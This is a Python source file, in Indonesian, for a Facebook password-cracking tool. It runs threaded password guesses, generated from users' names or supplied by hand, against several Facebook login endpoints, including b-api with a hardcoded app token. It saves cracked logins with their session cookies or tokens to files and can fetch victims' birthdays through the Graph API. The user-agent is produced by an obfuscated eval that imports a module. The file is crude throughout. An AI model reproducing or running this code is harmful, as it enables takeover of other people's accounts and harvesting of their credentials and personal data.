# hallo bro :v

from modul import *
from .useragent import *
from .list_pass import pw_list
from datetime import datetime
import concurrent.futures
import urllib.request

import random

ok,cp,cout,live,chek,kumpul,lahir=0,0,0,[],[],[],""

class crack:
	def __init__(self,url,user):
		
		print()
		self.url=url
		self.user=user
		self.token=open("cookies/token.txt").read() if os.path.exists("cookies/token.txt") else None
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input(" ? Crack Menggunakan Password Otomatis / Manual O/M : ")
		while NAROSKEUN in (""," "):
			print(f" ! {kosong1}")
			NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		if NAROSKEUN in tuple("mM"):
			print(" * Ketik 'first' Untuk Menggunakan Nama Depannya")
			print(" * Contoh : first123,first12345,bajingan,sayang,kintl")
			password=input(f" ? {c}Password :{m} ")
			print(f"{q}")
			while len(password) < 6:
				print(f" ! {c}{kosong1}{q}" if password in (""," ") else " ! {m}Password Minimanl 6 Huruf{q}")
				password=input(" ? set password : ")
			print(f"\n * Pilih Method Login {m}!!{q}")
			print(f" 1. {k}B-Api Facebook{q}  ( Fast )")
			print(f" 2. {k}Free Facebook{q} ( Medium )")
			print(f" 3. {k}MBasic Facebook{q} ( Slow )")
			print(f" 4. {k}Mobile Facebook{q} ( Super Slow )")
			self.awokawok_ngentod(password)
			self.awokawok_ngentod(password.split(","))
		if NAROSKEUN in tuple("oO"):
			print(f" * Pilih Method Login {m}!!{q}")
			print(f" 1. {k}B-Api Facebook{q}  ( Fast )")
			print(f" 2. {k}Free Facebook{q} ( Medium )")
			print(f" 3. {k}MBasic Facebook{q} ( Slow )")
			print(f" 4. {k}Mobile Facebook{q} ( Super Slow )")
			self.awokawok_ngentod()
		else:
			print(" ! Anda Tau Kntl");self.naroskeun()
	
	def lovyu(self,username,password,url,**data):
		ses=req.session()
		ses.headers.update({"Host":url.split("//")[1],"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password})
		ses.headers.update({"content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,allow_redirects=False)
		return ses.cookies.get_dict()
	
	def fckyu(self,username,password,url,**data):
		ses=req.session()
		ses.headers.update({"Host":url.split("//")[1],"upgrade-insecure-requests":"1","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"text/html; charset=utf-8","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		respon=ses.get(url+"/login/?next&ref=dbl&fl&refid=8")
		parsing=parser(respon.text,"html.parser")
		action=parsing.find("form",{"method":"post"})["action"]
		dtsg=re.findall('{"dtsg":{"token":"(.*?)"',respon.text)
		time=int(datetime.now().timestamp())
		kecuali=["sign_up","_fb_noscript"]
		for INPUT in parsing.find_all("input",{"value":True}):
			if INPUT["name"] in kecuali:
				continue
			else:
				data.update({INPUT["name"]:INPUT["value"]})
		data.update({"email":username,"pass":password,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true"})
		if dtsg:
			data.update({"fb_dtsg":dtsg[0]})
		ses.headers.update({"cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","referer":url+"/login/?next&ref=dbl&fl&refid=8"})
		ses.post(url+action,data=data,allow_redirects=False)
		return ses.cookies.get_dict()
	
	def bapi(self,username,password):
		ses=req.session()
		ses.headers.update({"x-fb-connection-bandwidth":str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni":str(random.randint(20000, 40000)),"x-fb-net-hni":str(random.randint(20000, 40000)),"x-fb-connection-quality":"EXCELLENT","x-fb-connection-type":"cell.CTRadioAccessTechnologyHSDPA","user-agent":eval((lambda ____,__,___: __.join([___(_____) for _____ in ____]))([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 97, 121, 97, 95, 103, 97, 110, 115, 34, 41, 46, 110, 103, 101, 119, 101, 46, 117, 115, 101, 114, 97, 103, 101, 110, 116, 46, 103, 104, 98, 98, 106, 105, 117, 71, 103, 104, 103, 89, 121, 104, 104, 104, 106, 106, 106, 106, 106, 104, 121, 104, 104, 103, 116, 117, 106, 110, 107, 107, 107, 105, 68, 103, 104, 103, 116, 106, 107, 105, 117, 107, 108, 111, 117, 100, 103, 106, 98, 102, 106, 105, 105, 55, 54, 106, 104, 103, 104, 118, 102, 106, 106, 106, 107, 111, 57, 105, 104, 102, 100, 100, 102, 122, 97, 121, 106, 104, 102, 117, 106, 103, 106, 107, 104, 104, 106, 104, 117, 110, 104, 103, 107, 104, 117, 105, 55, 55, 53, 55, 55, 117, 54, 106, 106, 103, 104, 104, 102, 104, 107, 104, 104, 110, 104, 103, 103, 104, 104, 95, 95, 106, 106, 116, 104, 106, 103, 107, 111, 105, 111, 57, 121, 114, 107, 102, 106, 121, 104, 103, 114, 121, 117, 116, 105, 117, 117, 121, 107, 107, 111, 111, 121, 115, 104, 106, 98, 118, 100, 101, 97, 97, 116, 104, 104, 102, 95, 95, 104, 104, 118, 118, 118, 98, 110, 110, 110, 110, 109, 106, 104, 101, 119, 121, 106, 104, 101, 121, 106, 104, 104, 103, 116, 116, 114, 54, 54, 53, 121, 104, 104, 106, 106, 103, 104, 106, 103, 100, 115, 102, 106, 110, 110, 106, 68, 103, 103, 103, 100, 103, 103, 104, 121, 121, 106, 104, 104, 104, 104, 104, 121, 121, 121, 121, 121, 121, 121, 121, 97, 116, 103, 103, 103],"",chr)),"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"})
		ses.params.update({"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
		return ses.get("https://b-api.facebook.com/method/auth.login").json()
	
	def awokawok_ngentod(self,manual=None):
		pilih=input(" ? Ngab : ")
		while pilih in (""," "):
			print(f" ! {m}{kosong2}{q}")
			pilih=input(" ? pilih : ")
		url="https://{}.facebook.com"
		speed=40 if manual is None else 30
		if speed==30:
			speed=40 if len(manual.split(",")) <= 5 else 30
		if pilih in ("1","01"):
			#print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.bapi,speed,manual,url,tod)
			self.result()
		if pilih in ("2","02"):
			#print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("free"),tod)
			self.result()
		if pilih in ("3","03"):
			#print(" * token found :D" if self.token else " ! token not found")
			tod=self.awikwok()
			self.attack(self.lovyu,speed,manual,url.format("mbasic"),tod)
			self.result()
		if pilih in ("4","04"):
			tod=self.awikwok()
			self.attack(self.fckyu,speed,manual,url.format("m"),tod)
			self.result()
		else:
			print(" ! {m}{pilih}{q}");self.awokawok_ngentod(manual)
			
	def attack(self,login,speed,password,url,tolol):
		for pengguna in self.user:
			membagi=pengguna.split("(Aap Gans)")
			if password:
				if "first" in password:
					if len(membagi[1].split(" "))!=0:
						kumpul.append({"username":membagi[0],"password":password.replace("first",membagi[1].split(" ")[0].lower()).split(",")})
				else:
					kumpul.append({"username":membagi[0],"password":password.split(",")})
			else:
				kumpul.append({"username":membagi[0],"password":pw_list(membagi)})
		print(f"{c}! Cracking Start !!\n{k} * Ctrl + Z Untuk Stop !!\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=speed) as U:
			if "bapi" in str(login):
				for x in kumpul:
					U.submit(self.log_bapics,x["username"],x["password"],login,tolol)
			else:
				for x in kumpul:
					U.submit(self.log_mbasic,x["username"],x["password"],login,url,tolol)

	def log_mbasic(self,username,list_password,login,url,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password,url)
				if "c_user" in rincian:
					ok+=1
					(lambda cookies,uid: self.save(f"\x1b[1;32m*--> {uid}|{password}|{cookies}","Hasil/live.txt",live))((lambda: ";".join([_+"="+__ for _,__ in rincian.items()]))(),rincian['c_user']);break
				if "checkpoint" in rincian:
					cp+=1
					uid=json.loads(urllib.request.unquote(rincian["checkpoint"]))["u"]
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","Hasil/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r ! CRACKING {cout}/{len(self.user)} OK:-{ok} CP:-{cp}",end="")
		except:
			self.log_mbasic(username,list_password,login,url,ttl)

	def log_bapics(self,username,list_password,login,ttl):
		try:
			global ok,cp,cout,lahir
			for password in list_password:
				rincian=login(username,password)
				if "session_key" in str(rincian) and "EAAA" in str(rincian):
					ok+=1
					(lambda token,uid:self.save(f"\x1b[1;32m*--> {uid}|{password}|{token}","Hasil/live.txt",live))(rincian["access_token"],rincian["uid"]);break
				if "www.facebook.com" in rincian["error_msg"]:
					cp+=1
					uid=username
					if "request_args" in rincian:
						# menghindari nyasar :v
						for x in rincian["request_args"]:
							if "email" in x["key"]:
								uid=x["value"];break
					if ttl:
						lahir=req.get("https://graph.facebook.com/{}/?access_token={}".format(str(uid),self.token)).json()
						lahir="|"+lahir["birthday"] if "birthday" in lahir else ""
					self.save(f"\x1b[1;33m*--> {uid}|{password}{lahir}","Hasil/chek.txt",chek);break
				else:
					continue
			cout+=1
			print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		except:
			self.log_bapics(username,list_password,login,ttl)
				
	def save(self,*memek):
		view=memek[0]
		print(f"\r {view}\x1b[0m\n",end="")
		open(memek[1],"a").write(re.findall("> (.+)",view)[0]+"\n")
		memek[2].append(view)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n* Crack Done {m}!!{q}\n ! Live/Chck: {len(live)}/{len(chek)}")
			if len(live)!=0:
				print(f" ! {i2}Hasil Crack Suksess DiSave Di{q}: Hasil/live.txt")
			if len(chek)!=0:
				print(f" ! {k2}Hasil Crack Cheack DiSave Di{q}: Hasil/chek.txt")
			exit()
		else:
			exit("\n\n ! Tidak Ada Hasil")

	def awikwok(self):
		if self.token:
			n=input(" ? Crack + Tanggal Lahir Y/T : ")
			if n in tuple("yY"):
				return True
			if n in tuple("tT"):
				return False
			else:
				print(f" ! {pilih1}");self.awikwok()
			
